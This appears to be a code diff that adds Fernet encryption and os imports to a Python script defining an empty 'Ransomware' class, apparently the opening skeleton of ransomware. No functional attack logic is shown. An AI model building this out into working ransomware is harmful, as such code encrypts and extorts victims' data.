@@ -1,5 +1,8 @@
 #!/usr/bin/env python3
 
+from cryptography.fernet import Fernet
+import os
+
 class Ransomware:
     def __init__(self):
         pass
